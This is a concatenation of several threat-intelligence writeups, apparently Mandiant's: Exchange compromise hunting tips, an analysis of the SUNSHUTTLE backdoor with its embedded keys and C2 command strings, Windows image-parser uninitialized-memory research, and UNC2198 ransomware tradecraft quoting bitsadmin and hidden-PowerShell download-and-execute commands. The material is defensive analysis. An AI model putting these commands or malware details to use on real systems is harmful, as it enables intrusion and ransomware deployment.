in the current domain. If the system is in a single-system domain, it will execute on the local computer. Per Microsoft’s blog, they have identified additional post-exploitation activities, including: Credential theft via dumping of LSASS process memory. Compression of data for exfiltration via 7-Zip. Use of Exchange PowerShell Snap-ins to export mailbox data. Use of additional offensive security tools Covenant , Nishang , and PowerCat for remote access. The activity we have observed, coupled with others in the information security industry, indicate that these threat actors are likely using Exchange Server vulnerabilities to gain a foothold into environments. This activity is followed quickly by additional access and persistent mechanisms. As previously stated, we have multiple ongoing cases and will continue to provide insight as we respond to intrusions. Investigation Tips We recommend checking the following for potential evidence of compromise: Child processes of C:\\Windows\\System32\\inetsrv\\w3wp.exe on Exchange Servers, particularly cmd.exe . Files written to the system by w3wp.exe or UMWorkerProcess.exe . ASPX files owned by the SYSTEM user New, unexpected compiled ASPX files in the Temporary ASP.NET Files directory Reconnaissance, vulnerability-testing requests to the following resources from an external IP address: /rpc/ directory /ecp/DDI/DDIService.svc/SetObject Non-existent resources With suspicious or spoofed HTTP User-Agents Unexpected or suspicious Exchange PowerShell SnapIn requests to export mailboxes In our investigations to date, the web shells placed on Exchange Servers have been named differently in each intrusion, and thus the file name alone is not a high-fidelity indicator of compromise. If you believe your Exchange Server was compromised, we recommend investigating to determine the scope of the attack and dwell time of the threat actor. Furthermore, as system and web server logs may have time or size limits enforced, we recommend preserving the following artifacts for forensic analysis: At least 14 days of HTTP web logs from the inetpub\\Logs\\LogFiles directories (include logs from all subdirectories) The contents of the Exchange Web Server (also found within the inetpub folder) At least 14 days of Exchange Control Panel (ECP) logs, located in Program Files\\Microsoft\\Exchange Server\\v15\\Logging\\ECP\\Server Microsoft Windows event logs We have found significant hunting and analysis value in these log folders, especially for suspicious CMD parameters in the ECP Server logs. We will continue updating technical details as we observe more related activity. Technical Indicators The following are technical indicators we have observed, organized by the threat groups we currently associate with this activity. To increase investigation transparency, we are including a Last Known True, or LKT, value for network indicators. The LKT timestamp indicates the last time Mandiant knew the indicator was associated with the adversary; however, as with all ongoing intrusions, a reasonable time window should be considered.

                "text": "Executive Summary In August 2020, a U.S.-based entity uploaded a new backdoor that we have named SUNSHUTTLE to a public malware repository. SUNSHUTTLE is a second-stage backdoor written in GoLang that features some detection evasion capabilities. Mandiant observed SUNSHUTTLE at a victim compromised by UNC2452, and have indications that it is linked to UNC2452, but we have not fully verified this connection. Please see the Technical Annex for relevant MITRE ATT&CK techniques (T1027, T1027.002, T1059.003, T1071.001, T1105, T1140, T1573.001). The activity discussed in this blog post is also detailed in a Microsoft blog post . We thank the team at Microsoft and other partners for their great collaboration in tracking this actor. Threat Detail Mandiant Threat Intelligence discovered a new backdoor uploaded by a U.S.-based entity to a public malware repository in August 2020 that we have named SUNSHUTTLE. SUNSHUTTLE is written in GO, and reads an embedded or local configuration file, communicates with a hard-coded command and control (C2) server over HTTPS, and supports commands including remotely uploading its configuration, file upload and download, and arbitrary command execution. Notably, SUNSHUTTLE uses cookie headers to pass values to the C2, and if configured, can select referrers from a list of popular website URLs to help such network traffic “blend in.” The SUNSHUTTLE backdoor file examined, “Lexicon.exe” (MD5: 9466c865f7498a35e4e1a8f48ef1dffd), was written in GoLang. The file unpacks into MD5: 86e89349fefcbdd9d2c80ca30fa85511. The infection vector for SUNSHUTTLE is not known. It is most likely a second-stage backdoor dropped after an initial compromise. The SUNSHUTTLE sample uses the actor-controlled server “reyweb[.]com” for C2. “Reyweb[.]com” is registered anonymously via NameSilo, a domain provider who accepts bitcoin payment and has been used for C2 registration by state-sponsored APTs in the past, including Russia-nexus actors and Iran-nexus APTs Mandiant observed SUNSHUTTLE at a victim compromised by UNC2452, and have indications that it is linked to UNC2452, but we have not fully verified this connection. Please see FireEye’s resource center for background on UNC2452 and the SUNBURST campaign . Outlook and Implications The new SUNSHUTTLE backdoor is a sophisticated second-stage backdoor that demonstrates straightforward but elegant detection evasion techniques via its “blend-in” traffic capabilities for C2 communications. SUNSHUTTLE would function as second-stage backdoor in such a compromise for conducting network reconnaissance alongside other SUNBURST-related tools. Technical Annex Mandiant Threat Intelligence discovered a sample of the SUNSHUTTLE backdoor uploaded to an online multi-Antivirus scan service. SUNSHUTTLE is a backdoor, written in GO, that reads an embedded or local configuration file, communicates with its C2 server over HTTPS and supports commands including remotely updating its configuration, file upload and download, and arbitrary command execution. Lexicon.exe (MD5: 9466c865f7498a35e4e1a8f48ef1dffd) C2: reyweb[.]com UNAVAILABLE (MD5: 86e89349fefcbdd9d2c80ca30fa85511) Unpacked version of 9466c865f7498a35e4e1a8f48ef1dffd Infection Vector For the samples analyzed, the infection vector is not known. Execution Execution Summary SUNSHUTTLE is a backdoor written in GoLang. Once SUNSHUTTLE is executed, a high-level description of the execution is the following: Configuration settings determined Request a “session key” from the C2 Retrieve the “session key” from the C2 Once a session key is retrieved, SUNSHUTTLE begins command request beaconing loop Begin command request beaconing Resolve command and perform action The SUNSHUTTLE sample analyzed retains the names of the routines used by the malware, which include the following: main.request_session_key main.define_internal_settings main.send_file_part main.clean_file main.send_command_result main.retrieve_session_key main.save_internal_settings main.resolve_command main.write_file main.beaconing main.wget_file main.fileExists main.encrypt main.decrypt main.random main.removeBase64Padding main.addBase64Padding main.delete_empty main.Unpad main.GetMD5Hash main.Pad Note: Throughout the SUNSHUTTLE backdoor, unique string identifiers are used to indicate the operation being performed to the C2 via a Cookie header, and unique string identifiers are also used to validate and parse response content from the C2. These unique string values are thought to be unique and random per compiled sample. Initial Execution Once executed, the SUNSHUTTLE backdoor enumerates the victim’s MAC address and compares it to a hardcoded MAC address value “c8:27:cc:c2:37:5a”. If a match is found the backdoor exits. The MAC address is likely a default MAC address for the Windows sandbox network adapter. Figure 1: Mac address check Configuration If the check is successful, the SUNSHUTTLE backdoor then enters a routine named “﻿main_define_internal_settings”, which handles creation of the configuration file if one doesn’t already exist in the directory from which SUNSHUTTLE is running. For the sample analyzed, the configuration filename is “config.dat.tmp”. The configuration data is Base64 encoded and AES-256 encrypted using the following key: hz8l2fnpvp71ujfy8rht6b0smouvp9k8 The configuration has the following example values when Base64 decoded and AES decrypted: 48b9e25491e088a35105274cae0b9e67|5-15|0|0|TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6NzUuMCkgR2V ja28vMjAxMDAxMDEgRmlyZWZveC83NS4w The configuration holds several values delimited by a “|” character, which are briefly described as follows. 48b9e25491e088a35105274cae0b9e67 MD5 hash of the current timestamp calculated during execution. 5-15 Lower/upper limits used to randomly generate sleep times as SUNSHUTTLE executes 0 0 or 1 — Utilize “blend-in” traffic requests. Internally called “false_requesting” 0 Activate execution timestamp (0 by default) — execution \"activates\" or continues if current time is greater than the value in the configuration TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6NzUuMCkgR2Vja2 8vMjAxMDAxMDEgRmlyZWZveC83NS4w Base64-encoded User-agent used in HTTPS requests Decoded: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 If set in the configuration, the “blend-in” traffic occurs as the malware executes and transitions through its routines.

The retrieved session key from the C2 appears to be RSA decrypted using the following private key that is embedded in SUNSHUTTLE and believed to be unique per compiled sample. Analysis is on-going on how the decrypted session key is used, but it is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines. -----BEGIN PRIVATE KEY----- MIIEowIBAAKCAQEA0Aj/3K3m/rKNESwUfHC9qAhnsNYA9bJ4HQ30DPsfPDvbbHZm Uj5nyp2abjYZYMQbWa2+ZO4Ixgfdm0FzsAH/haKIN4sSkbw+YRESYW35MnMI3Adf mj/eK/yKNblyoe/7iWP3nz+y4Q/QI0L6BrF7VodTaDYtDup3iI+B5zjmhElf9Fmg S1JiDUgydz5VXJR/esv6hB7GMfEb/3sIAzv5qcwEvGK5HH1EzQ7zjauyhbsF9pHR zCFYlvW4OtaU0o3xjVufo5UwYRS5p/EFpof45zuJGLJ02cKUmxc0OX53t3Bn9WXY aDDhYp/RPzywG8N9gTBv8rKxRIsFxxKu+8wK+QIDAQABAoIBAGe4hPDe13OXTBQK uTAN+dEkV6ZoHFRjpdU+lrY+IiWi5lSed4d7y73OdCeM23xOaiB9KpchwsgRNeDp cieH54EWNvoSYbC9fRBiNZrT/NG1Xu5s0rKSM1AU+kes7UVl5DBs4hHI7YOeobRi +UuLA6ZxlBk6IZ71MaGpgyfoS64aDMvZDtcaTEGzw6dRQAU9255DTIc2YYbq8MqL zSafD5eBDH3Izmblg0kXiidec1A1sytz5u8xW4XckHfp4xePLVw/RvLJGqNJMK5M 7tXAFwPzg+u4k7ce7uNw9VWW7n28T9xznUux1gtPQj1N6goDaBaOqY+h0ia9F1RP wu6ZtG0CgYEA8vCFmAGmMz4vjO04ELyPnvnaS6CReYCVzmvNugIDlxBLDGCnKBVx et7qEk3gMkbtcDUOZpXQAIVCWQNupAhI0t5bb/Pfw3HtH3Xt5NRUYmwxTgNRe06D i4ICsg2+8TDinjne9hzsEe9DYE2WRrtLMJ+IPD+QE94J3Sei03k1wpMCgYEA2zga Tff6jQeNn9G0ipHa1DvJmi98px51o0r7TUfZRxJfgg4ckyMsZUHKALrZszKAnxP7 MXYrJuOHpsp0EZc1e3uTjFzrKyKRTQ78c7MNGv07w1PlZuNLtkoqepUjkQzdxKZO g9gG0O4lC5jjnSg8jUSChhZn+jrU8Vx7ByOP98MCgYAWi5+6RZzo8IJ1L6aeVwF1 HXbWweX+QqKkb3i+JGW05Twxv96DZ8oKPxm17Sg7Qj3Sxfm6J3kQM02++QSRkHtB poUR1K4Vc0MwQj97lwDlyWih9sjfCqBGmCAr6f6oX4MIcBJzAKgf2faEv26MzeDi eEuqW7PBRD/iGEWSHpOQpQKBgQDRgV+aTjk0mRhfugHKQLSbCnyUj3eZG8IfiiR7 agQcKVH/sE7cy8u9Bc/xPKGb4dMMtQLm9WEuLFtTKr8cpJ8nYSXVCmRx9/pXY9Af HuqSdZutBDwERYvxLhZEys2P7XTwYGQ/GrEA8eeTms1FP9QGyofXcAh1G86w0Mp/ Oxx3EwKBgHXxgQa4/ngTlMNhWP+IvHOlOVAxDK2GL3XQdr8fudZe9c1d7VzIbYj6 gbwLT9qi0wG5FAWqH163XucAirT6WCtAJ3tK0lfbS7oWJ7L/Vh1+vOe6jfS/nQna Ao2QPbN8RiltHeaAq0ZfrgwrQuP5fmigmBa5lOWID/eU2OLlvJGi -----END PRIVATE KEY--- After the configuration is created or read from, SUNSHUTTLE enters a routine named “﻿main_request_session_key”. The malware will iterate over this routine until it’s successful, sleeping a period of time after each iteration. Inside the “﻿main_request_session_key” routine, SUNSHUTTLE constructs an HTTPS request to its configured C2. Upon an HTTP 200 response from the request, the response data from the C2 is expected to not contain the following string for the sample analyzed: ywQdjLuHHC The request_session_key routine returns a 1 if the string is not in the response and a -1 if it is in the response. If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine. The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key. The decrypted content is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines. Commanding Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and “resolve_command” routines in a loop. SUNSHUTTLE first issues a beacon to retrieve a command. After, SUNSHUTTLE will enter the routine “resolve_command”, which parses the response content to determine which command should be run. Available commands include remotely updating its configuration, file upload and download, and arbitrary command execution. Figure 2: Resolve command graph The content returned from the C2 after the “main_beaconing” routine is Base64 decoded and AES decrypted. A check is performed to ensure the decrypted content doesn’t contain the following string: Cp5RTQ31R1 As noted, it is likely these strings are unique per sample and randomly generated at compilation. The decrypted content is parsed for certain unique strings.﻿ Unique string in decrypted response Meaning zSsP2TSJJm3a Update sleep range — save config ﻿aQJmWJzXdYK721mGBI3U Update “false requesting” value – save config ﻿W5VYP9Iu2uyHK Update C2 URL and User-agent – save config ﻿3487wD9t2OZkvqdwRpqPeE Send current timestamp to C2 ﻿ubFxROBRwfswVRWNjLC Update \"activation\" timestamp in the config — save config ﻿TMuhGdA9EHY Upload file to C2 if the file exists 1kG4NaRX83BCMgLo38Bjq Execute command – return “EXECED” if successful hB0upT6CUmdRaR2KVBvxrJ Execute command – return results/output N/A (other string criteria met) Provides terminal command execution N/A (other string criteria met) Download file from C2 Files Dropped After successful execution of the malware, it drops the following files to the victim’s system: <current_directory>\\config.dat.tmp (MD5: Dynamic) Encrypted configuration file Persistence Method The SUNSHUTTLE malware was not observed setting its own persistence. It is likely the persistence is set outside of the execution of SUNSHUTTLE. Network Communications SUNSHUTTLE uses the cookie header to pass values to the C2. Additionally, a referrer is selected from the following list, presumably to make the traffic blend in if traffic is being decrypted for inspection: www.bing.com www.yahoo.com www.google.com www.facebook.com The cookie headers vary slightly depending on the operation being performed. The following is an example request to the C2 from the “request_session_key” routine.

                "text": "Continuing our discussion of image parsing vulnerabilities in Windows , we take a look at a comparatively less popular vulnerability class: uninitialized memory. In this post, we will look at Windows’ inbuilt image parsers—specifically for vulnerabilities involving the use of uninitialized memory. The Vulnerability: Uninitialized Memory In unmanaged languages, such as C or C++, variables are not initialized by default. Using uninitialized variables causes undefined behavior and may cause a crash. There are roughly two variants of uninitialized memory: Direct uninitialized memory usage: An uninitialized pointer or an index is used in read or write. This may cause a crash. Information leakage (info leak) through usage of uninitialized memory: Uninitialized memory content is accessible across a security boundary. An example: an uninitialized kernel buffer accessible from user mode, leading to information disclosure. In this post we will be looking closely at the second variant in Windows image parsers, which will lead to information disclosure in situations such as web browsers where an attacker can read the decoded image back using JavaScript. Detecting Uninitialized Memory Vulnerabilities Compared to memory corruption vulnerabilities such as heap overflow and use-after-free, uninitialized memory vulnerabilities on their own do not access memory out of bound or out of scope. This makes detection of these vulnerabilities slightly more complicated than memory corruption vulnerabilities. While direct uninitialized memory usage can cause a crash and can be detected, information leakage doesn’t usually cause any crashes. Detecting it requires compiler instrumentations such as MemorySanitizer or binary instrumentation/recompilation tools such as Valgrind. Detour: Detecting Uninitialized Memory in Linux Let's take a little detour and look at detecting uninitialized memory in Linux and compare with Windows’ built-in capabilities. Even though compilers warn about some uninitialized variables, most of the complicated cases of uninitialized memory usage are not detected at compile time. For this, we can use a run-time detection mechanism. MemorySanitizer is a compiler instrumentation for both GCC and Clang, which detects uninitialized memory reads. A sample of how it works is given in Figure 1. $ cat sample.cc #include <stdio.h> int main() { int *arr = new int[10]; if(arr[3] == 0) { printf(\"Yay!\\n\"); } printf(\"%08x\\n\", arr[3]); return 0; } $ clang++ -fsanitize=memory -fno-omit-frame-pointer -g sample.cc $ ./a.out ==29745==WARNING: MemorySanitizer: use-of-uninitialized-value #0 0x496db8  (/home/dan/uni/a.out+0x496db8) #1 0x7f463c5f1bf6  (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #2 0x41ad69  (/home/dan/uni/a.out+0x41ad69) SUMMARY: MemorySanitizer: use-of-uninitialized-value (/home/dan/uni/a.out+0x496db8) Exiting Figure 1: MemorySanitizer detection of uninitialized memory Similarly, Valgrind can also be used to detect uninitialized memory during run-time. Detecting Uninitialized Memory in Windows Compared to Linux, Windows lacks any built-in mechanism for detecting uninitialized memory usage. While Visual Studio and Clang-cl recently introduced AddressSanitizer support , MemorySanitizer and other sanitizers are not implemented as of this writing. Some of the useful tools in Windows to detect memory corruption vulnerabilities such as PageHeap do not help in detecting uninitialized memory. On the contrary, PageHeap fills the memory allocations with patterns, which essentially makes them initialized. There are few third-party tools, including Dr.Memory, that use binary instrumentation to detect memory safety issues such as heap overflows, uninitialized memory usages, use-after-frees, and others. Detecting Uninitialized Memory in Image Decoding Detecting uninitialized memory in Windows usually requires binary instrumentation, especially when we do not have access to source code. One of the indicators we can use to detect uninitialized memory usage, specifically in the case of image decoding, is the resulting pixels after the image is decoded. When an image is decoded, it results in a set of raw pixels. If image decoding uses any uninitialized memory, some or all of the pixels may end up as random. In simpler words, decoding an image multiple times may result in different output each time if uninitialized memory is used. This difference of output can be used to detect uninitialized memory and aid writing a fuzzing harness targeting Windows image decoders. An example fuzzing harness is presented in Figure 2. #define ROUNDS 20 unsigned char* DecodeImage(char *imagePath) { unsigned char *pixels = NULL; // use GDI or WIC to decode image and get the resulting pixels ... ... return pixels; } void Fuzz(char *imagePath) { unsigned char *refPixels = DecodeImage(imagePath); if(refPixels != NULL) { for(int i = 0; i < ROUNDS; i++) { unsigned char *currPixels = DecodeImage(imagePath); if(!ComparePixels(refPixels, currPixels)) { // the reference pixels and current pixels don't match // crash now to let the fuzzer know of this file CrashProgram(); } free(currPixels); } free(refPixels); } } Figure 2: Diff harness The idea behind this fuzzing harness is not entirely new; previously, lcamtuf used a similar idea to detect uninitialized memory in open-source image parsers and used a web page to display the pixel differences. Fuzzing With the diffing harness ready, one can proceed to look for the supported image formats and gather corpuses. Gathering image files for corpus is considerably easy given the near unlimited availability on the internet, but at the same time it is harder to find good corpuses among millions of files with unique code coverage. Code coverage information for Windows image parsing is tracked from WindowsCodecs.dll. Note that unlike regular Windows fuzzing, we will not be enabling PageHeap this time as PageHeap “initializes” the heap allocations with patterns. Results During my research, I found three cases of uninitialized memory usage while fuzzing Windows built-in image parsers. Two of them are explained in detail in the next sections. Root cause analysis of uninitialized memory usage is non-trivial. We don’t have a crash location to back trace, and have to use the resulting pixel buffer to back trace to find the root cause—or use clever tricks to find the deviation. CVE-2020-0853 Let’s look at the rendering of the proof of concept (PoC) file before going into the root cause of this vulnerability. For this we will use lcamtuf’s HTML, which loads the PoC image multiple times and compares the pixels with reference pixels. Figure 3: CVE-2020-0853 As we can see from the resulting images (Figure 3), the output varies drastically in each decoding and we can assume this PoC leaks a lot of uninitialized memory. To identify the root cause of these vulnerabilities, I used Time Travel Debugging (TTD) extensively. Tracing back the execution and keeping track of the memory address is a tedious task, but TTD makes it only slightly less painful by keeping the addresses and values constant and providing unlimited forward and backward executions. After spending quite a bit of time debugging the trace, I found the source of uninitialized memory in windowscodecs!CFormatConverter::Initialize . Even though the source was found, it was not initially clear why this memory ends up in the calculation of pixels without getting overwritten at all. To solve this mystery, additional debugging was done by comparing PoC execution trace against a normal TIFF file decoding. The following section shows the allocation, copying of uninitialized value to pixel calculation and the actual root cause of the vulnerability. Allocation and Use of Uninitialized Memory windowscodecs!CFormatConverter::Initialize allocates 0x40 bytes of memory, as shown in Figure 4. 0:000> r rax=0000000000000000 rbx=0000000000000040 rcx=0000000000000040 rdx=0000000000000008 rsi=000002257a3db448 rdi=0000000000000000 rip=00007ffaf047a238 rsp=000000ad23f6f7c0 rbp=000000ad23f6f841 r8=000000ad23f6f890  r9=0000000000000010 r10=000002257a3db468 r11=000000ad23f6f940 r12=000000000000000e r13=000002257a3db040 r14=000002257a3dbf60 r15=0000000000000000 iopl=0         nv up ei pl zr na po nc cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246 windowscodecs!CFormatConverter::Initialize+0x1c8: 00007ffa`f047a238 ff15ea081200    call    qword ptr [windowscodecs!_imp_malloc (00007ffa`f059ab28)] ds:00007ffa`f059ab28={msvcrt!malloc (00007ffa`f70e9d30)} 0:000> k # Child-SP          RetAddr               Call Site 00 000000ad`23f6f7c0 00007ffa`f047c5fb     windowscodecs!CFormatConverter::Initialize+0x1c8 01 000000ad`23f6f890 00007ffa`f047c2f3     windowscodecs!CFormatConverter::Initialize+0x12b 02 000000ad`23f6f980 00007ff6`34ca6dff     windowscodecs!CFormatConverterResolver::Initialize+0x273 // Uninitialized memory after allocation : 0:000> db @rax 00000225`7a3dbf70  d0 b0 3d 7a 25 02 00 00-60 24 3d 7a 25 02 00 00  ..=z%...`$=z%... 00000225`7a3dbf80  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ 00000225`7a3dbf90  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ 00000225`7a3dbfa0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ 00000225`7a3dbfb0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................ 00000225`7a3dbfc0  00 00 00 00 00 00 00 00-64 51 7c 26 c3 2c 01 03  ........dQ|&.,.. 00000225`7a3dbfd0  f0 00 2f 6b 25 02 00 00-f0 00 2f 6b 25 02 00 00  ../k%...../k%... 00000225`7a3dbfe0  60 00 3d 7a 25 02 00 00-60 00 3d 7a 25 02 00 00  `.=z%...`.=z%... Figure 4: Allocation of memory The memory never gets written and the uninitialized values are inverted in windowscodecs!CLibTiffDecoderBase::HrProcessCopy and further processed in windowscodecs!GammaConvert_16bppGrayInt_128bppRGBA and in later called scaling functions. As there is no read or write into uninitialized memory before HrProcessCopy, I traced the execution back from HrProcessCopy and compared the execution traces with a normal tiff decoding trace. A difference was found in the way windowscodecs!CLibTiffDecoderBase::UnpackLine behaved with the PoC file compared to a normal TIFF file, and one of the function parameters in UnpackLine was a pointer to the uninitialized buffer. The UnpackLine function has a series of switch-case statements working with bits per sample (BPS) of TIFF images. In our PoC TIFF file, the BPS value is 0x09—which is not supported by UnpackLine —and the control flow never reaches a code path that writes to the buffer. This is the root cause of the uninitialized memory, which gets processed further down the pipeline and finally shown as pixel data. Patch After presenting my analysis to Microsoft, they decided to patch the vulnerability by making the files with unsupported BPS values as invalid. This avoids all decoding and rejects the file in the very early phase of its loading. CVE-2020-1397 Figure 5: Rendering of CVE-2020-1397 Unlike the previous vulnerability, the difference in the output is quite limited in this one, as seen in Figure 5. One of the simpler root cause analysis techniques that can be used to figure out a specific type of uninitialized memory usage is comparing execution traces of runs that produce two different outputs. This specific technique can be helpful when an uninitialized variable causes a control flow change in the program and that causes a difference in the outputs. For this, a binary instrumentation script was written, which logged all the instructions executed along with its registers and accessed memory values. Diffing two distinct execution traces by comparing the instruction pointer (RIP) value, I found a control flow change in windowscodecs!CCCITT::Expand2DLine due to a usage of an uninitialized value.

                "text": "Mandiant Advanced Practices (AP) closely tracks the shifting tactics, techniques, and procedures (TTPs) of financially motivated groups who severely disrupt organizations with ransomware. In May 2020, FireEye released a blog post detailing intrusion tradecraft associated with the deployment of MAZE . As of publishing this post, we track 11 distinct groups that have deployed MAZE ransomware. At the close of 2020, we noticed a shift in a subset of these groups that have started to deploy EGREGOR ransomware in favor of MAZE ransomware following access acquired from ICEDID infections. Since its discovery in 2017 as a banking trojan, ICEDID evolved into a pernicious point of entry for financially motivated actors to conduct intrusion operations. In earlier years, ICEDID was deployed to primarily target banking credentials. In 2020 we observed adversaries using ICEDID more explicitly as a tool to enable access to impacted networks, and in many cases this was leading to the use of common post-exploitation frameworks and ultimately the deployment of ransomware. This blog post shines a heat lamp on the latest tradecraft of UNC2198, who used ICEDID infections to deploy MAZE or EGREGOR ransomware. Building an Igloo: ICEDID Infections Separate phases of intrusions are attributed to different uncategorized (UNC) groups when discrete operations such as obtaining access are not part of a contiguous operation. Pure “access operations” establish remote access into a target environment for follow on operations actioned by a separate group. A backdoor deployed to establish an initial foothold for another group is an example of an access operation. Between July and December 2020, an ICEDID phishing infection chain consisted of a multi-stage process involving MOUSEISLAND and PHOTOLOADER (Figure 1). Figure 1: Example UNC2420 MOUSEISLAND to ICEDID Infection Chain MOUSEISLAND is a Microsoft Word macro downloader used as the first infection stage and is delivered inside a password-protected zip attached to a phishing email (Figure 2). Based on our intrusion data from responding to ICEDID related incidents, the secondary payload delivered by MOUSEISLAND has been PHOTOLOADER, which acts as an intermediary downloader to install ICEDID. Mandiant attributes the MOUSEISLAND distribution of PHOTOLOADER and other payloads to UNC2420 , a distribution threat cluster created by Mandiant’s Threat Pursuit team. UNC2420 activity shares overlaps with the publicly reported nomenclature of “ Shathak ” or “ TA551 ”. Figure 2: UNC2420 MOUSEISLAND Phishing Email Ice, Ice, BEACON...UNC2198 Although analysis is always ongoing, at the time of publishing this blog post, Mandiant tracks multiple distinct threat clusters (UNC groups) of various sizes that have used ICEDID as a foothold to enable intrusion operations. The most prominent of these threat clusters is UNC2198 , a group that has targeted organizations in North America across a breadth of industries. In at least five cases, UNC2198 acquired initial access from UNC2420 MOUSEISLAND to conduct intrusion operations. In 2020, Mandiant attributed nine separate intrusions to UNC2198. UNC2198’s objective is to monetize their intrusions by compromising victim networks with ransomware. In July 2020, Mandiant observed UNC2198 leverage network access provided by an ICEDID infection to encrypt an environment with MAZE ransomware. As the year progressed into October and November, we observed UNC2198 shift from deploying MAZE to using EGREGOR ransomware during another Incident Response engagement. Like MAZE, EGREGOR is operated using an affiliate model , where affiliates who deploy EGREGOR are provided with proceeds following successful encryption and extortion for payment. The UNC2198 cluster expanded over the course of more than six months. Mandiant’s December 2020 blog post on UNCs described the analytical tradecraft we use to merge and graduate clusters of activity. Merging UNCs is a substantial analytical practice in which indicators and tradecraft attributed to one group are scrutinized against another. Two former UNCs that shared similar modus operandi were eventually merged into UNC2198. The Snowball Effect of Attribution AP created UNC2198 based on a single intrusion in June 2020 involving ICEDID, BEACON, SYSTEMBC and WINDARC. UNC2198 compromised 32 systems in 26 hours during this incident; however, ransomware was not deployed. Throughout July 2020 we attributed three intrusions to UNC2198 from Incident Response engagements, including one resulting in the deployment of MAZE ransomware. In October 2020, a slew of activity at both Incident Response engagements and Managed Defense clients resulted in the creation of two new UNC groups, and another incident attributed to UNC2198. One of the new UNC groups created in October 2020 was given the designation UNC2374. UNC2374 began as its own distinct cluster where BEACON, WINDARC, and SYSTEMBC were observed during an incident at a Managed Defense customer. Initial similarities in tooling did not constitute a strong enough link to merge UNC2374 with UNC2198 yet. Two and a half months following the creation of UNC2374, we amassed enough data points to merge UNC2374 into UNC2198. Some of the data points used in merging UNC2374 into UNC2198 include: UNC2198 and UNC2374 Cobalt Strike Team Servers used self-signed certificates with the following subject on TCP port 25055: C = US, ST = CA, L = California, O = Oracle Inc, OU = Virtual Services, CN = oracle.com UNC2198 and UNC2374 deployed WINDARC malware to identical file paths: %APPDATA%\\teamviewers\\msi.dll The same code signing certificate used to sign an UNC2198 BEACON loader was used to sign two UNC2374 SYSTEMBC tunneler payloads. UNC2374 and UNC2198 BEACON C2 servers were accessed by the same victim system within a 10-minute time window during intrusion operations. The other UNC group created in October 2020 was given the designation UNC2414. Three separate intrusions were attributed to UNC2414, and as the cluster grew, we surfaced similarities between UNC2414 and UNC2198. A subset of the data points used to merge UNC2414 into UNC2198 include: UNC2198 and UNC2414 BEACON servers used self-signed certificates using the following subject on TCP port 25055: C = US, ST = CA, L = California, O = Oracle Inc, OU = Virtual Services, CN = oracle.com UNC2198 and UNC2414 installed BEACON as C:\\Windows\\int32.dll UNC2198 and UNC2414 installed the RCLONE utility as C:\\Perflogs\\rclone.exe UNC2198 and UNC2414 were proven to be financially motivated actors that had leveraged ICEDID as initial access: UNC2198 had deployed MAZE UNC2414 had deployed EGREGOR The merge between UNC2198 and UNC2414 was significant because it revealed UNC2198 has access to EGREGOR ransomware. The timing of the EGREGOR usage is also consistent with MAZE ransomware shutting down as reported by Mandiant Intelligence. Figure 3 depicts the timeline of related intrusions and merges into UNC2198. Figure 3: UNC2198 timeline UNC2198 Intrusion Flow: After Initial Access Expanding the UNC2198 cluster through multiple intrusions and merges with other UNC groups highlights the range of TTPs employed. We have pulled out some key data from all our UNC2198 intrusions to illustrate an amalgamation of capabilities used by the threat actor. Establish Foothold After obtaining access, UNC2198 has deployed additional malware using various techniques. For instance, UNC2198 used InnoSetup droppers to install a WINDARC backdoor on the target host. UNC2198 also used BITS Jobs and remote PowerShell downloads to download additional tools like SYSTEMBC for proxy and tunneler capabilities. Example commands for download and execution are: %COMSPEC% /C echo bitsadmin /transfer 257e http://<REDACTED>/<REDACTED>.exe %APPDATA%<REDACTED>.exe & %APPDATA%<REDACTED>.exe & del %APPDATA% <REDACTED>.exe ^> %SYSTEMDRIVE%\\WINDOWS\\Temp\\FmpaXUHFennWxPIM.txt > \\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat & %COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\MwUgqKjEDjCMDGmC.bat %COMSPEC% /C echo powershell.exe -nop -w hidden -c (new-object System.Net.WebClient).Downloadfile(http://<REDACTED>/<REDACTED>.exe, <REDACTED>.exe) ^> %SYSTEMDRIVE%\\WINDOWS\\Temp\\AVaNbBXzKyxktAZI.txt > \\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat & %COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\yoKjaqTIzJhdDLjD.bat UNC2198 has used Cobalt Strike BEACON, Metasploit METERPRETER, KOADIC, and PowerShell EMPIRE offensive security tools during this phase as well. Offensive Security Tooling UNC2198 has used offensive security tools similarly seen across many threat actors. UNC2198 has used BEACON in roughly 90% of their intrusions. UNC2198 installs and executes Cobalt Strike BEACON in a variety of ways, including shellcode loaders using PowerShell scripts, service executables, and DLLs. While the ways and means of using BEACON are not inherently unique, there are still aspects to extrapolate that shed light on UNC2198 TTPs. Focusing in on specific BEACON executables tells a different story beyond the use of the tool itself. Aside from junk code and API calls, UNC2198 BEACON and METERPRETER executables often exhibit unique characteristics of malware packaging, including odd command-line arguments visible within strings and upon execution via child processes: cmd.exe /c echo TjsfoRdwOe=9931 & reg add HKCU\\SOFTWARE\\WIlumYjNSyHob /v xFCbJrNfgBNqRy /t REG_DWORD /d 3045 & exit cmd.exe /c echo ucQhymDRSRvq=1236 & reg add HKCU\\\\SOFTWARE\\\\YkUJvbgwtylk /v KYIaIoYxqwO /t REG_DWORD /d 9633 & exit cmd.exe /c set XlOLqhCejHbSNW=8300 & reg add HKCU\\SOFTWARE\\WaMgGneKhtgTTy /v LbmWADsevLywrkP /t REG_DWORD /d 3809 & exit These example commands are non-functional, as they do not modify or alter payload execution. Another technique involves installing BEACON using a file path containing mixed Unicode-escaped and ASCII characters to evade detection: Unicode Escaped 